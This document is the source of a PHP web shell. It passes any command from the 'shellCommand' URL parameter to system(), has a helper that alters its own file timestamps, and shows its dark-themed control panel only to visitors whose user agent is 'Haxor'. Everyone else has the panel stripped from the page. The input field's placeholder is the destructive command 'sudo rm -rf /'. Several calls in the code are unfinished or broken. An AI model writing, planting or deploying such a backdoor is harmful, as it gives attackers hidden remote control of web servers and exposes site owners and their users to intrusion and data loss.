<?php
	error_reporting(E_ALL);
	
	$ip = $_SERVER['SERVER_ADDR'];
	$port = $_SERVER['SERVER_PORT'];
	$file = basename(__FILE__); 
	$connectstr = "http://".$ip.":".$port."/".$file;

	class UserInterface
	{
		public $pwd = "";
		private $currentUser = "";
		private $mode = "r";
		private $errorToo = '2>&1';
		private $command = "";

		public function doCommand($command)
		{
			return system($command);
		}
		
		public function getPwd()
		{
			$this->doCommand("/bin/pwd");
		}

		public function cd($path)
		{
			chdir($path);
		}

		public function timeStamp($stamp)
		{
			$nothing = popen("touch " . __FILE__ . " -t {$stamp}",$this->mode);
		}

		public function getVersion()
		{
			$version = "Current PHP Version: " . phpversion();
			return $version;
		}
	}
 
	?>

<?php if (isset($_GET['command']) || isset($_GET['shellCommand'])): ?>
<?php
	$userInterface = new UserInterface();
	if(isset($_GET['command'])) {
		$command = $_GET['command'];
		switch($command) {
			case "pwd":
				$userInterface->getPwd();
				break;
			case "perm":
				$permissions = $userInterface.getPermissions();
				break;
			case "ps":
				$processes = $userInterface.getProcesses();
				break;
		}
	}
	
	if(isset($_GET['shellCommand'])) {
		$myCommand = $_GET['shellCommand'];
		$shellOut = $userInterface->doCommand($myCommand);
		echo $shellOut;
	}


?>
<?php else: ?>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<div id="haxored" hidden="true">

<style rel="stylesheet" type="text/css">
#XmenuNav {
	background-color: #161616;
	float: center;
	width: 100%;
	height: 7%;
}

#menuNav ul {
	float: center;
}

#XmenuNav ul li {
	list-style-type: none;
	display: inline;
}

#XmenuNav #home {
	background-color: #2d2d2d;
	color: #fff;
	border: 0px;
}


#XmenuNav li button {
	height: 100%;
	border: 0px;
	padding: 0 10px;	
	float: left;
	color: #605e56;
	background-color: #161616;
}

#XmenuNav li button:hover {
	background-color: #2d2d2d;
	color: #fff;
	border: 0px;
}
#XsideBar {
	float: right;
	width: 12%;
	height: 100%;
	clear: right;
	padding: 20px 0;
	margin: 0;
	display: inline;
	background-color: #151515;
	color: #fff;
}

#XsideBar ul li {
	list-style-type: none;
}

#XmainShell {
	float: left;
	clear: left;
	height: 100%;
	padding: 20px 0px;
	margin: 0px;
	background-color: #1f1f1f;
	color: #fff;
	width: 88%;
}

#XoutputShell {
	float: top;
	height: 95%;
}

#Xprompt {
	padding-left: 20%;
	height: 100%;
}

#Xprompt input {
	background-color: #161616;
	text-color: green;
	border: none;
}

#XinputShell {
	margin-left: 3%;
	margin-right: 3%;
	padding-left: 2%;
	padding-right: 2%;
}

#XinputShell input {
	width: 100%;
	height: 50px;
	border: 0px;
	padding-left: 10px;
	font-family: monospace;
	font-size: 15px;
	color: #cad0c4;
	background-color: #323232;
}

#XShellContainer {
	margin-top: 2%;
	margin-left: 5%;
	margin-right: 5%;
	padding-left: 2%;
	padding-right: 2%;
	background-color: #2d2d2d;
	height: 50%;
}

#XShellOutput {
	font-family: monospace;
	padding-top: 15px;
}

#XShellOutput p {
	margin-top: 1px;
	margin-bottom: 1px;
}


</style>
<div id="Xcontainer">
	<div id="XmenuNav">
		<form action="" id="XmenuForm">
		<ul class="XmenuOptions">
			<li><button id="home"> Home </button></li>
			<li><button id="XbuttonPwd" name="command" value="pwd">PWD</button></li>
			<li><button id="XbuttonPerm" name="command" value="perm">Permissions</button></li>
			<li><button id="XbuttonPs" name="command" value="ps">Processes</button></li>
		</ul>
		</form>
	<br>
	</div>
	<div id="XmainContainer">
		<div id="XsideBar">
			<ul>
				<li id="XPHPversion">Something here?</li>
				<li>or here</li>
				<li>or here</li>
			</ul>
		</div>
		<div id="XmainShell">
			<div id="XShellContainer">
				<div id="XShellOutput">
					<p> Sample output </p>
					<p> Sample output </p>
					<p> Sample output </p>
					<p> Sample output </p>
				</div>
			</div>
			<div id="XinputShell">
				<input type="text" placeholder="sudo rm -rf /" name="shell">
			</div>
		</div>
		<script type="text/javascript">
$(document).ready( function() {

	function submit(command) {
		$.ajax({
		url: "<?php echo $connectstr; ?>",
			type: "GET",
			data: {"command": command},
			success: function(data) {
				alert(data);
			}
		});
	}
	

	var request = "";

	
	$("#XbuttonPwd").on('click', function(e) {
		e.preventDefault();
		request = "pwd";
		submit(request);
	});

	$("#XbuttonPerm").on('click', function(e) {
		e.preventDefault();
		request = "perm";
		submit(request);
	});

	$("#XbuttonPs").on('click', function(e) {
		e.preventDefault();
		request = "ps";
		submit(request);
	});

	var xmenuform = document.getElementById("XmenuForm");
	xmenuform.addEventListener("keydown", function(e) {
		if (e.which == 13) {
			console.log("Hello")
		}
	});

	$("#XPHPversion").val("<?php echo $userInterface->getVersion(); ?>");
});
</script>
</div>

<script type="text/javascript">
	$(document).ready(function() {
		if(navigator.userAgent == "Haxor") {
			console.log("Hello Master.")
			$("body").css({"margin":"0px"});
			$("#luserContent").remove();
			$("#haxored").prop("hidden", false);
		} else {
			console.log("#");	
			$("#haxored").remove();
		}
	});
</script>
<!-- Below here should be the closing </body> tag -->
<?php endif; ?>

